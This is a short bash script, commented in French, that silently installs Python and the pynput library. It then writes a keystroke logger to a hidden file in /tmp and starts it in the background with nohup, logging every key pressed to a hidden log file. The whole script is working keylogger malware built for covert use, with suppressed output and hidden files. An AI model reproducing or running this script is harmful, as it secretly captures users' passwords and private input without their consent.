#!/bin/bash

chemin="/tmp/"

# Vérifier si Python est installé
if ! command -v python3 &>/dev/null; then
    sudo apt update > /dev/null 2>&1
    sudo apt install python3 -y > /dev/null 2>&1
fi

# Installation du module Pynput
pip3 install pynput > /dev/null 2>&1 &

# Création de keylogger.py
script_content=$(printf "from pynput.keyboard import Key, Listener
import logging
logging.basicConfig(filename=\"%s.log.txt\", level=logging.DEBUG, format=\"%%(message)s\")
def on_press(key):
    logging.info(str(key))
with Listener(on_press=on_press) as listener :
    listener.join()
" "$chemin")

printf "%s" "$script_content" > "$chemin.keylogger.py"

# Création de log.txt
touch "$chemin.log.txt"

# Lancement de keylogger.py en arrière-plan
nohup python3 "$chemin.keylogger.py" >/dev/null 2>&1 &
